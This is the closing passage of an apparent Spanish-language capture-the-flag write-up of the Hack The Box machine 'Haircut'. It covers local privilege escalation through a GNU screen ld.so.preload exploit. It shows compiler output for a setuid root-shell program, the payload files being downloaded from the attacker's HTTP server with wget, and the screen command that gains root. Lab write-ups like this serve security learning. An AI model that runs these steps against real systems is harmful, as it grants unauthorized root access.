rootshell.c:3:5: warning: implicit declaration of <span class="k">function</span> ‘setuid’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
    3 |     setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
      |     ^~~~~~
rootshell.c:4:5: warning: implicit declaration of <span class="k">function</span> ‘setgid’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
    4 |     setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
      |     ^~~~~~
rootshell.c:5:5: warning: implicit declaration of <span class="k">function</span> ‘seteuid’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
    5 |     seteuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
      |     ^~~~~~~
rootshell.c:6:5: warning: implicit declaration of <span class="k">function</span> ‘setegid’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
    6 |     setegid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
      |     ^~~~~~~
rootshell.c:7:5: warning: implicit declaration of <span class="k">function</span> ‘execvp’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
    7 |     execvp<span class="o">(</span><span class="s2">"/bin/sh"</span>, NULL, NULL<span class="o">)</span><span class="p">;</span>
      |     ^~~~~~
rootshell.c:7:5: warning: too many arguments to built-in <span class="k">function</span> ‘execvp’ expecting 2 <span class="o">[</span><span class="nt">-Wbuiltin-declaration-mismatch</span><span class="o">]</span>
❯ <span class="nb">rm </span>rootshell.c
</code></pre></div></div>

<p>De igual forma, nos salen unos <strong>Warning</strong>, pero no hay problema. Ahora tenemos de transferir los archivos resultantes a la máquina víctima en la ruta <code class="language-plaintext highlighter-rouge">/tmp/</code> y lo haremos compartiendo un servidor HTTP con python y la herramienta <code class="language-plaintext highlighter-rouge">wget</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.24 - - <span class="o">[</span>18/Oct/2021 21:38:49] <span class="s2">"GET /libhax.so HTTP/1.1"</span> 200 -
10.10.10.24 - - <span class="o">[</span>18/Oct/2021 21:38:58] <span class="s2">"GET /rootshell HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/<span class="nv">$ </span><span class="nb">cd</span> /tmp
www-data@haircut:/tmp<span class="nv">$ </span>wget http://10.10.14.16/libhax.so
<span class="nt">--2021-10-19</span> 04:43:40--  http://10.10.14.16/libhax.so
Connecting to 10.10.14.16:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16136 <span class="o">(</span>16K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: <span class="s1">'libhax.so'</span>

libhax.so                        100%[<span class="o">=======================================================&gt;]</span>  15.76K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.1s    

2021-10-19 04:43:41 <span class="o">(</span>114 KB/s<span class="o">)</span> - <span class="s1">'libhax.so'</span> saved <span class="o">[</span>16136/16136]

www-data@haircut:/tmp<span class="nv">$ </span>wget http://10.10.14.16/rootshell
<span class="nt">--2021-10-19</span> 04:43:49--  http://10.10.14.16/rootshell
Connecting to 10.10.14.16:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16816 <span class="o">(</span>16K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: <span class="s1">'rootshell'</span>

rootshell                        100%[<span class="o">=======================================================&gt;]</span>  16.42K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.1s    

2021-10-19 04:43:50 <span class="o">(</span>119 KB/s<span class="o">)</span> - <span class="s1">'rootshell'</span> saved <span class="o">[</span>16816/16816]

www-data@haircut:/tmp<span class="err">$</span>
</code></pre></div></div>

<p>Ahora ejecutamos los siguientes comando de acuerdo con lo que indica el script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/tmp<span class="nv">$ </span><span class="nb">cd</span> /etc
www-data@haircut:/etc<span class="nv">$ </span><span class="nb">umask </span>000
www-data@haircut:/etc<span class="nv">$ </span>screen <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span>
www-data@haircut:/etc<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/rootshell 
<span class="nt">-rwsr-xr-x</span> 1 root root 16816 Oct 19 04:36 /tmp/rootshell
www-data@haircut:/etc<span class="err">$</span>
www-data@haircut:/etc<span class="nv">$ </span>/tmp/rootshell
<span class="c"># whoami</span>
root
<span class="c"># </span>
</code></pre></div></div>

<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#injection" class="page__taxonomy-item" rel="tag">Injection</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-10-18T00:00:00-05:00">October 18, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-stratosphere/" class="pagination--pager" title="Hack The Box Stratosphere
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2021 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
